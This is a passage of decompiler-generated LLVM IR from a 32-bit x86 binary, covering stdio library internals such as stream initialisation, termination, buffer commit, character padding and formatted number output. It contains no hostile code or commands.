  %v0_805108e = load i32, i32* @ebp, align 4
  %v1_805108e = add i32 %v0_805108e, 4
  %v2_805108e = inttoptr i32 %v1_805108e to i32*
  %v3_805108e = load i32, i32* %v2_805108e, align 4
  store i32 %v3_805108e, i32* %stack_var_-76, align 4
  %v1_8051091 = call i32 @isatty(i32 %v3_805108e)
  %v2_8051099 = mul i32 %v1_8051091, 256
  store i32 %v2_8051099, i32* %eax.global-to-local, align 4
  %v0_805109c = load i32, i32* @ebx, align 4
  %v2_805109c = or i32 %v0_805109c, %v2_8051099
  store i32 %v2_805109c, i32* @ebx, align 4
  %v1_805109e = trunc i32 %v2_805109c to i16
  %v2_805109e = load i32, i32* @ebp, align 4
  %v3_805109e = inttoptr i32 %v2_805109e to i16*
  store i16 %v1_805109e, i16* %v3_805109e, align 2
  %v0_80510a2 = load i32, i32* @edi, align 4
  %v1_80510a2 = load i32, i32* @esi, align 4
  %v2_80510a2 = inttoptr i32 %v1_80510a2 to i32*
  store i32 %v0_80510a2, i32* %v2_80510a2, align 4
  %v0_80510a4 = load i32, i32* @ebp, align 4
  %v1_80510a4 = add i32 %v0_80510a4, 8
  %v2_80510a4 = inttoptr i32 %v1_80510a4 to i32*
  %v3_80510a4 = load i32, i32* %v2_80510a4, align 4
  %v4_80510a4 = icmp eq i32 %v3_80510a4, 0
  %v1_80510a8 = icmp eq i1 %v4_80510a4, false
  br i1 %v1_80510a8, label %dec_label_pc_80510d8, label %dec_label_pc_80510aa

dec_label_pc_80510aa:                             ; preds = %dec_label_pc_8051062
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_80510b2 = call i32 @malloc(i32 4096)
  store i32 %v1_80510b2, i32* %eax.global-to-local, align 4
  %v1_80510ba = load i32, i32* @ebp, align 4
  %v2_80510ba = add i32 %v1_80510ba, 8
  %v3_80510ba = inttoptr i32 %v2_80510ba to i32*
  store i32 %v1_80510b2, i32* %v3_80510ba, align 4
  %v1_80510bd = icmp eq i32 %v1_80510b2, 0
  %v0_80510d1 = load i32, i32* @ebp, align 4
  br i1 %v1_80510bd, label %dec_label_pc_80510d1, label %dec_label_pc_80510c1

dec_label_pc_80510c1:                             ; preds = %dec_label_pc_80510aa
  %v1_80510c1 = inttoptr i32 %v0_80510d1 to i16*
  %v2_80510c1 = load i16, i16* %v1_80510c1, align 2
  %v3_80510c1 = or i16 %v2_80510c1, 16384
  store i16 %v3_80510c1, i16* %v1_80510c1, align 2
  %v1_80510c7 = add i32 %v1_80510b2, 4096
  store i32 %v1_80510c7, i32* %eax.global-to-local, align 4
  %v1_80510cc = load i32, i32* @ebp, align 4
  %v2_80510cc = add i32 %v1_80510cc, 12
  %v3_80510cc = inttoptr i32 %v2_80510cc to i32*
  store i32 %v1_80510c7, i32* %v3_80510cc, align 4
  br label %dec_label_pc_80510d8

dec_label_pc_80510d1:                             ; preds = %dec_label_pc_80510aa
  %v1_80510d1 = add i32 %v0_80510d1, 12
  %v2_80510d1 = inttoptr i32 %v1_80510d1 to i32*
  store i32 0, i32* %v2_80510d1, align 4
  br label %dec_label_pc_80510d8

dec_label_pc_80510d8:                             ; preds = %dec_label_pc_8051062, %dec_label_pc_80510c1, %dec_label_pc_80510d1
  %v0_80510d8 = load i32, i32* @ebp, align 4
  %v1_80510d8 = add i32 %v0_80510d8, 8
  %v2_80510d8 = inttoptr i32 %v1_80510d8 to i32*
  %v3_80510d8 = load i32, i32* %v2_80510d8, align 4
  store i32 %v3_80510d8, i32* %eax.global-to-local, align 4
  %v1_80510db = add i32 %v0_80510d8, 2
  %v2_80510db = inttoptr i32 %v1_80510db to i8*
  store i8 0, i8* %v2_80510db, align 1
  %v0_80510df = load i32, i32* %eax.global-to-local, align 4
  %v1_80510df = load i32, i32* @ebp, align 4
  %v2_80510df = add i32 %v1_80510df, 24
  %v3_80510df = inttoptr i32 %v2_80510df to i32*
  store i32 %v0_80510df, i32* %v3_80510df, align 4
  %v0_80510e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510e2 = load i32, i32* @ebp, align 4
  %v2_80510e2 = add i32 %v1_80510e2, 28
  %v3_80510e2 = inttoptr i32 %v2_80510e2 to i32*
  store i32 %v0_80510e2, i32* %v3_80510e2, align 4
  %v0_80510e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510e5 = load i32, i32* @ebp, align 4
  %v2_80510e5 = add i32 %v1_80510e5, 16
  %v3_80510e5 = inttoptr i32 %v2_80510e5 to i32*
  store i32 %v0_80510e5, i32* %v3_80510e5, align 4
  %v0_80510e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510e8 = load i32, i32* @ebp, align 4
  %v2_80510e8 = add i32 %v1_80510e8, 20
  %v3_80510e8 = inttoptr i32 %v2_80510e8 to i32*
  store i32 %v0_80510e8, i32* %v3_80510e8, align 4
  %v0_80510eb = load i32, i32* @ebp, align 4
  %v1_80510eb = add i32 %v0_80510eb, 44
  %v2_80510eb = inttoptr i32 %v1_80510eb to i32*
  store i32 0, i32* %v2_80510eb, align 4
  %v0_80510f2 = load i32, i32* @ebp, align 4
  %v1_80510f2 = add i32 %v0_80510f2, 1
  %v2_80510f2 = inttoptr i32 %v1_80510f2 to i8*
  %v3_80510f2 = load i8, i8* %v2_80510f2, align 1
  %v4_80510f2 = and i8 %v3_80510f2, 32
  %v5_80510f2 = icmp eq i8 %v4_80510f2, 0
  %v0_80510f6 = load i32, i32* @global_var_805b2cc.475, align 4
  store i32 %v0_80510f6, i32* @eax, align 4
  %v2_80510fb = add i32 %v0_80510f2, 52
  %v3_80510fb = inttoptr i32 %v2_80510fb to i32*
  store i32 %v0_80510f6, i32* %v3_80510fb, align 4
  br i1 %v5_80510f2, label %dec_label_pc_805116d, label %dec_label_pc_8051100

dec_label_pc_8051100:                             ; preds = %dec_label_pc_80510d8
  %v2_805110b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805110b, i32* %stack_var_-76, align 4
  %v2_8051110 = call i32 @__pthread_return_void(i32 %v2_805110b, i32 134563799)
  store i32 %v2_8051110, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b2b4.472 to i32), i32* %stack_var_-76, align 4
  %v1_805111c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  store i32 %v1_805111c, i32* @eax, align 4
  %v2_805112e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805112e, i32* %stack_var_-76, align 4
  %v2_8051133 = call i32 @__pthread_return_void(i32 %v2_805112e, i32 134563799)
  store i32 %v2_8051133, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b29c.476 to i32), i32* %stack_var_-76, align 4
  %v1_805113f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b29c.476 to i32))
  %v0_8051144 = load i32, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 8
  store i32 %v0_8051144, i32* @eax, align 4
  %v1_8051149 = load i32, i32* @ebp, align 4
  %v2_8051149 = add i32 %v1_8051149, 32
  %v3_8051149 = inttoptr i32 %v2_8051149 to i32*
  store i32 %v0_8051144, i32* %v3_8051149, align 4
  %v0_805114c = load i32, i32* @ebp, align 4
  store i32 %v0_805114c, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 8
  %v2_8051152 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8051152, i32* @ecx, align 4
  store i32 %v2_805112e, i32* %stack_var_-76, align 4
  %v2_8051157 = call i32 @__pthread_return_void(i32 %v2_805112e, i32 1)
  store i32 %v2_805112e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_805110b, i32* %stack_var_-76, align 4
  %v2_8051161 = call i32 @__pthread_return_void(i32 %v2_805110b, i32 1)
  store i32 %v2_8051161, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051166

dec_label_pc_8051166:                             ; preds = %dec_label_pc_8050f93, %dec_label_pc_8051100
  br label %dec_label_pc_805116d

dec_label_pc_805116b:                             ; preds = %dec_label_pc_8050f89, %dec_label_pc_8050f76
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805116d

dec_label_pc_805116d:                             ; preds = %dec_label_pc_80510d8, %dec_label_pc_8050fc2, %dec_label_pc_8051166, %dec_label_pc_805116b
  %v0_8051170 = load i32, i32* @ebp, align 4
  store i32 %v0_8051170, i32* %eax.global-to-local, align 4
  %v2_8051172 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051172, i32* @ebx, align 4
  store i32 %v0_8050f4a, i32* @esi, align 4
  store i32 %v0_8050f49, i32* @edi, align 4
  store i32 %v0_8050f48, i32* @ebp, align 4
  ret i32 %v0_8051170

; uselistorder directives
  uselistorder i32 %v2_805112e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_805110b, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80510d1, { 1, 0 }
  uselistorder i32 %v1_80510b2, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8051099, { 1, 0 }
  uselistorder i32 %v1_8051082, { 1, 0, 2 }
  uselistorder i32 %v11_8051044, { 1, 0 }
  uselistorder i32 %v0_805104d.pre, { 1, 0 }
  uselistorder i32 %v1_8051015, { 1, 0 }
  uselistorder i32 %v0_8051011, { 1, 0 }
  uselistorder i32 %v1_8051006, { 1, 0, 2 }
  uselistorder i32 %v1_8050fc7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_8050fb6, { 1, 0 }
  uselistorder i32 %v0_8050f89, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_805116d, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8051166, { 1, 0 }
  uselistorder label %dec_label_pc_80510d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051047, { 1, 0 }
  uselistorder label %dec_label_pc_8051037, { 1, 0 }
  uselistorder label %dec_label_pc_8050ff4, { 1, 0 }
  uselistorder label %dec_label_pc_8050fbe, { 1, 0 }
  uselistorder label %dec_label_pc_8050fb0, { 1, 0 }
  uselistorder label %dec_label_pc_8050fa5, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051179 = load i32, i32* @edi, align 4
  %v0_805117a = load i32, i32* @esi, align 4
  %v0_805117b = load i32, i32* @ebx, align 4
  store i32 %v0_805117b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8051184 = call i32 @__errno_location(i32 %v0_805117b)
  store i32 %v1_8051184, i32* @edi, align 4
  %v0_805118e = load i32, i32* @global_var_805b2e0.468, align 32
  store i32 %v0_805118e, i32* @esi, align 4
  %v1_8051194 = inttoptr i32 %v1_8051184 to i32*
  %v2_8051194 = load i32, i32* %v1_8051194, align 4
  store i32 %v2_8051194, i32* %ebp.global-to-local, align 4
  %v1_8051198 = call i32 @isatty(i32 0)
  %v0_805119d = load i32, i32* @ebx, align 4
  %v2_805119f = sub i32 %v0_805119d, %v1_8051198
  %v2_80511aa = mul i32 %v2_805119f, 256
  %v0_80511ad = load i32, i32* @esi, align 4
  %v2_80511ad = xor i32 %v0_80511ad, %v2_80511aa
  %v1_80511af = trunc i32 %v2_80511ad to i16
  store i16 %v1_80511af, i16* bitcast (i32* @global_var_805b2e0.468 to i16*), align 32
  %v0_80511b6 = load i32, i32* @global_var_805b330.469, align 16
  store i32 %v0_80511b6, i32* @esi, align 4
  %v1_80511bc = call i32 @isatty(i32 1)
  %v0_80511c1 = load i32, i32* @ebx, align 4
  %v2_80511c1 = sub i32 %v0_80511c1, %v1_80511bc
  %v2_80511c3 = mul i32 %v2_80511c1, 256
  %v0_80511c6 = load i32, i32* @esi, align 4
  %v2_80511c6 = xor i32 %v2_80511c3, %v0_80511c6
  %v1_80511c8 = trunc i32 %v2_80511c6 to i16
  store i16 %v1_80511c8, i16* bitcast (i32* @global_var_805b330.469 to i16*), align 16
  %v0_80511cf = load i32, i32* %ebp.global-to-local, align 4
  %v1_80511cf = load i32, i32* @edi, align 4
  %v2_80511cf = inttoptr i32 %v1_80511cf to i32*
  store i32 %v0_80511cf, i32* %v2_80511cf, align 4
  %v2_80511d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80511d4, i32* @ebx, align 4
  store i32 %v0_805117a, i32* @esi, align 4
  store i32 %v0_8051179, i32* @edi, align 4
  ret i32 %v1_80511bc

; uselistorder directives
  uselistorder i32 %v1_8051184, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80511e7 = inttoptr i32 %arg1 to i16*
  %v4_80511e7 = call i32 @memcpy(i16* %v3_80511e7, i32 ptrtoint (i32* @global_var_8059820.478 to i32), i32 24)
  ret i32 %v4_80511e7
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80511f0 = load i32, i32* @esi, align 4
  %v0_80511f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80511f1, i32* %stack_var_-8, align 4
  %v1_80511fa = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b29c.476 to i32))
  store i32 %v1_80511fa, i32* %eax.global-to-local, align 4
  %v1_8051206 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  store i32 %v1_8051206, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_805125022 = icmp eq i32 %storemerge21, 0
  %v1_805125223 = icmp eq i1 %v1_805125022, false
  br i1 %v1_805125223, label %dec_label_pc_8051213.lr.ph, label %dec_label_pc_8051270.preheader

dec_label_pc_8051213.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051213

dec_label_pc_8051213:                             ; preds = %dec_label_pc_8051213.lr.ph, %dec_label_pc_805123a
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_8051213.lr.ph ], [ %storemerge, %dec_label_pc_805123a ]
  %v1_8051216 = add i32 %storemerge24, 56
  store i32 %v1_8051216, i32* @esi, align 4
  %v1_805121a = call i32 @__pthread_return_0(i32 %v1_8051216)
  store i32 %v1_805121a, i32* %eax.global-to-local, align 4
  %v1_8051222 = icmp eq i32 %v1_805121a, 0
  br i1 %v1_8051222, label %dec_label_pc_805123a, label %dec_label_pc_8051226

dec_label_pc_8051226:                             ; preds = %dec_label_pc_8051213
  %v0_8051226 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051226 = add i32 %v0_8051226, 8
  %v2_8051226 = inttoptr i32 %v1_8051226 to i32*
  %v3_8051226 = load i32, i32* %v2_8051226, align 4
  store i32 %v3_8051226, i32* %eax.global-to-local, align 4
  %v1_8051229 = inttoptr i32 %v0_8051226 to i16*
  store i16 48, i16* %v1_8051229, align 2
  %v0_805122e = load i32, i32* %eax.global-to-local, align 4
  %v1_805122e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805122e = add i32 %v1_805122e, 24
  %v3_805122e = inttoptr i32 %v2_805122e to i32*
  store i32 %v0_805122e, i32* %v3_805122e, align 4
  %v0_8051231 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051231 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051231 = add i32 %v1_8051231, 28
  %v3_8051231 = inttoptr i32 %v2_8051231 to i32*
  store i32 %v0_8051231, i32* %v3_8051231, align 4
  %v0_8051234 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051234 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051234 = add i32 %v1_8051234, 16
  %v3_8051234 = inttoptr i32 %v2_8051234 to i32*
  store i32 %v0_8051234, i32* %v3_8051234, align 4
  %v0_8051237 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051237 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051237 = add i32 %v1_8051237, 20
  %v3_8051237 = inttoptr i32 %v2_8051237 to i32*
  store i32 %v0_8051237, i32* %v3_8051237, align 4
  br label %dec_label_pc_805123a

dec_label_pc_805123a:                             ; preds = %dec_label_pc_8051213, %dec_label_pc_8051226
  %v0_805123d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805123d = add i32 %v0_805123d, 52
  %v2_805123d = inttoptr i32 %v1_805123d to i32*
  store i32 1, i32* %v2_805123d, align 4
  %v0_8051244 = load i32, i32* @esi, align 4
  %v1_8051245 = call i32 @__stdio_init_mutex(i32 %v0_8051244)
  store i32 %v1_8051245, i32* %eax.global-to-local, align 4
  %v0_805124a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805124a = add i32 %v0_805124a, 32
  %v2_805124a = inttoptr i32 %v1_805124a to i32*
  %storemerge = load i32, i32* %v2_805124a, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8051250 = icmp eq i32 %storemerge, 0
  %v1_8051252 = icmp eq i1 %v1_8051250, false
  br i1 %v1_8051252, label %dec_label_pc_8051213, label %dec_label_pc_805124d.dec_label_pc_8051270.preheader_crit_edge

dec_label_pc_805124d.dec_label_pc_8051270.preheader_crit_edge: ; preds = %dec_label_pc_805123a
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805b298.477 to i32*), align 4
  br label %dec_label_pc_8051270.preheader

dec_label_pc_8051270.preheader:                   ; preds = %dec_label_pc_805124d.dec_label_pc_8051270.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_805124d.dec_label_pc_8051270.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80512703 = icmp eq i32 %storemerge12, 0
  %v1_805127210 = icmp eq i1 %v1_80512703, false
  br i1 %v1_805127210, label %dec_label_pc_805125c.preheader, label %dec_label_pc_8051274

dec_label_pc_805125c.preheader:                   ; preds = %dec_label_pc_8051270.preheader
  br label %dec_label_pc_805125c

dec_label_pc_805125c:                             ; preds = %dec_label_pc_805125c.preheader, %dec_label_pc_805126d
  %v0_8051264 = phi i32 [ %storemerge1, %dec_label_pc_805126d ], [ %storemerge12, %dec_label_pc_805125c.preheader ]
  %v1_805125c = inttoptr i32 %v0_8051264 to i8*
  %v2_805125c = load i8, i8* %v1_805125c, align 1
  %v3_805125c = and i8 %v2_805125c, 64
  %v4_805125c = icmp eq i8 %v3_805125c, 0
  br i1 %v4_805125c, label %dec_label_pc_805126d, label %dec_label_pc_8051261

dec_label_pc_8051261:                             ; preds = %dec_label_pc_805125c
  %v1_8051265 = call i32 @__stdio_wcommit(i32 %v0_8051264)
  store i32 %v1_8051265, i32* %eax.global-to-local, align 4
  %v0_805126d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805126d

dec_label_pc_805126d:                             ; preds = %dec_label_pc_805125c, %dec_label_pc_8051261
  %v0_805126d = phi i32 [ %v0_8051264, %dec_label_pc_805125c ], [ %v0_805126d.pre, %dec_label_pc_8051261 ]
  %v1_805126d = add i32 %v0_805126d, 32
  %v2_805126d = inttoptr i32 %v1_805126d to i32*
  %storemerge1 = load i32, i32* %v2_805126d, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8051270 = icmp eq i32 %storemerge1, 0
  %v1_8051272 = icmp eq i1 %v1_8051270, false
  br i1 %v1_8051272, label %dec_label_pc_805125c, label %dec_label_pc_8051274

dec_label_pc_8051274:                             ; preds = %dec_label_pc_805126d, %dec_label_pc_8051270.preheader
  %v2_8051274 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051274, i32* %eax.global-to-local, align 4
  %v2_8051275 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051275, i32* @ebx, align 4
  store i32 %v0_80511f0, i32* @esi, align 4
  ret i32 %v2_8051274

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_805126d, { 1, 0 }
  uselistorder label %dec_label_pc_805125c, { 1, 0 }
  uselistorder label %dec_label_pc_805123a, { 1, 0 }
  uselistorder label %dec_label_pc_8051213, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8051278 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051280 = add i32 %arg1, 8
  %v2_8051280 = inttoptr i32 %v1_8051280 to i32*
  %v3_8051280 = load i32, i32* %v2_8051280, align 4
  store i32 %v3_8051280, i32* %edx.global-to-local, align 4
  %v1_8051283 = add i32 %arg1, 16
  %v2_8051283 = inttoptr i32 %v1_8051283 to i32*
  %v3_8051283 = load i32, i32* %v2_8051283, align 4
  %v2_8051286 = sub i32 %v3_8051283, %v3_8051280
  %v12_8051286 = icmp eq i32 %v2_8051286, 0
  store i32 %v2_8051286, i32* %eax.global-to-local, align 4
  br i1 %v12_8051286, label %dec_label_pc_8051299, label %dec_label_pc_805128a

dec_label_pc_805128a:                             ; preds = %entry
  store i32 %v3_8051280, i32* %v2_8051283, align 4
  %v0_805128d = load i32, i32* @ecx, align 4
  %v0_805128e = load i32, i32* %eax.global-to-local, align 4
  %v0_805128f = load i32, i32* %edx.global-to-local, align 4
  %v0_8051290 = load i32, i32* @ebx, align 4
  %v4_8051291 = inttoptr i32 %v0_8051290 to i16*
  %v5_8051291 = call i32 @__stdio_WRITE(i16* %v4_8051291, i32 %v0_805128f, i32 %v0_805128e, i32 %v0_805128d)
  store i32 %v5_8051291, i32* %eax.global-to-local, align 4
  %v0_8051299.pre = load i32, i32* @ebx, align 4
  %v2_805129f.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051299

dec_label_pc_8051299:                             ; preds = %entry, %dec_label_pc_805128a
  %v2_805129f = phi i32 [ %tmp11, %entry ], [ %v2_805129f.pre, %dec_label_pc_805128a ]
  %v0_8051299 = phi i32 [ %arg1, %entry ], [ %v0_8051299.pre, %dec_label_pc_805128a ]
  %v1_8051299 = add i32 %v0_8051299, 16
  %v2_8051299 = inttoptr i32 %v1_8051299 to i32*
  %v3_8051299 = load i32, i32* %v2_8051299, align 4
  store i32 %v3_8051299, i32* %eax.global-to-local, align 4
  %v2_805129c = add i32 %v0_8051299, 8
  %v3_805129c = inttoptr i32 %v2_805129c to i32*
  %v4_805129c = load i32, i32* %v3_805129c, align 4
  %v5_805129c = sub i32 %v3_8051299, %v4_805129c
  store i32 %v5_805129c, i32* %eax.global-to-local, align 4
  store i32 %v2_805129f, i32* @edx, align 4
  store i32 %v0_8051278, i32* @ebx, align 4
  ret i32 %v5_805129c

; uselistorder directives
  uselistorder i32 %v0_8051299, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051299, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_80512a4 = load i32, i32* @edi, align 4
  %v0_80512a5 = load i32, i32* @esi, align 4
  %v0_80512a6 = load i32, i32* @ebx, align 4
  %v0_80512a7 = load i32, i32* @eax, align 4
  store i32 %v0_80512a7, i32* @edi, align 4
  %v0_80512ac = load i32, i32* @ecx, align 4
  store i32 %v0_80512ac, i32* @esi, align 4
  store i32 %v0_80512ac, i32* @ebx, align 4
  %v0_80512b0 = load i32, i32* @edx, align 4
  store i32 %v0_80512b0, i32* %stack_var_-13, align 4
  %v1_80512b72 = icmp eq i32 %v0_80512ac, 0
  br i1 %v1_80512b72, label %dec_label_pc_80512cf, label %dec_label_pc_80512bb.lr.ph

dec_label_pc_80512bb.lr.ph:                       ; preds = %entry
  %v2_80512bb = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_80512bb

dec_label_pc_80512b6:                             ; preds = %dec_label_pc_80512bb
  %v1_80512b6 = add i32 %v0_80512b6, -1
  %v8_80512b6 = icmp eq i32 %v1_80512b6, 0
  store i32 %v1_80512b6, i32* @ebx, align 4
  br i1 %v8_80512b6, label %dec_label_pc_80512cf.loopexit, label %dec_label_pc_80512b6.dec_label_pc_80512bb_crit_edge

dec_label_pc_80512b6.dec_label_pc_80512bb_crit_edge: ; preds = %dec_label_pc_80512b6
  %v0_80512bf.pre = load i32, i32* @edx, align 4
  %v0_80512c0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80512bb

dec_label_pc_80512bb:                             ; preds = %dec_label_pc_80512b6.dec_label_pc_80512bb_crit_edge, %dec_label_pc_80512bb.lr.ph
  %v0_80512c0 = phi i32 [ %v0_80512c0.pre, %dec_label_pc_80512b6.dec_label_pc_80512bb_crit_edge ], [ %v0_80512a7, %dec_label_pc_80512bb.lr.ph ]
  %v0_80512bf = phi i32 [ %v0_80512bf.pre, %dec_label_pc_80512b6.dec_label_pc_80512bb_crit_edge ], [ %v0_80512b0, %dec_label_pc_80512bb.lr.ph ]
  %v4_80512c4 = call i32 @__stdio_fwrite(i32 %v2_80512bb, i32 1, i32 %v0_80512c0, i32 %v0_80512bf)
  %v8_80512cc = icmp eq i32 %v4_80512c4, 1
  %v0_80512b6 = load i32, i32* @ebx, align 4
  br i1 %v8_80512cc, label %dec_label_pc_80512b6, label %dec_label_pc_80512cf.loopexit

dec_label_pc_80512cf.loopexit:                    ; preds = %dec_label_pc_80512b6, %dec_label_pc_80512bb
  %v1_80512cf.ph = phi i32 [ %v0_80512b6, %dec_label_pc_80512bb ], [ 0, %dec_label_pc_80512b6 ]
  %v0_80512cf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80512cf

dec_label_pc_80512cf:                             ; preds = %dec_label_pc_80512cf.loopexit, %entry
  %v0_80512cf = phi i32 [ 0, %entry ], [ %v0_80512cf.pre, %dec_label_pc_80512cf.loopexit ]
  %v1_80512cf = phi i32 [ 0, %entry ], [ %v1_80512cf.ph, %dec_label_pc_80512cf.loopexit ]
  %v2_80512cf = sub i32 %v0_80512cf, %v1_80512cf
  store i32 %v0_80512a6, i32* @ebx, align 4
  store i32 %v0_80512a5, i32* @esi, align 4
  store i32 %v0_80512a4, i32* @edi, align 4
  ret i32 %v2_80512cf

; uselistorder directives
  uselistorder i32 %v1_80512b6, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_80512cf.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_80512ed = trunc i32 %arg2 to i8
  %v5_80512ed = icmp slt i8 %v3_80512ed, 0
  %v1_80512ef = icmp eq i1 %v5_80512ed, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_80512ef, label %dec_label_pc_8051320, label %dec_label_pc_80512f1

dec_label_pc_80512f1:                             ; preds = %entry
  %v3_80512f8 = call i32 @strlen(i8* %arg4)
  %v0_8051300 = load i32, i32* @ebx, align 4
  %v2_8051300 = sub i32 %v0_8051300, %v3_80512f8
  store i32 %v2_8051300, i32* @ebx, align 4
  store i32 %v3_80512f8, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8051300, 1
  br i1 %tmp23, label %dec_label_pc_805131e, label %dec_label_pc_8051308

dec_label_pc_8051308:                             ; preds = %dec_label_pc_80512f1
  %v0_8051308 = load i32, i32* @edi, align 4
  %v1_8051308 = urem i32 %v0_8051308, 128
  store i32 %v1_8051308, i32* @edi, align 4
  store i32 %v2_8051300, i32* @ecx, align 4
  store i32 %v1_8051308, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8051313 = call i32 @_charpad()
  store i32 %v0_8051313, i32* @ebp, align 4
  %v12_805131a = icmp eq i32 %v0_8051313, %v2_8051300
  %v1_805131c = icmp eq i1 %v12_805131a, false
  br i1 %v1_805131c, label %dec_label_pc_805133a, label %dec_label_pc_8051308.dec_label_pc_805131e_crit_edge

dec_label_pc_8051308.dec_label_pc_805131e_crit_edge: ; preds = %dec_label_pc_8051308
  %v0_805131e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805131e

dec_label_pc_805131e:                             ; preds = %dec_label_pc_8051308.dec_label_pc_805131e_crit_edge, %dec_label_pc_80512f1
  %v0_805131e = phi i32 [ %v0_805131e.pre, %dec_label_pc_8051308.dec_label_pc_805131e_crit_edge ], [ %v3_80512f8, %dec_label_pc_80512f1 ]
  store i32 %v0_805131e, i32* @ebx, align 4
  br label %dec_label_pc_8051320

dec_label_pc_8051320:                             ; preds = %entry, %dec_label_pc_805131e
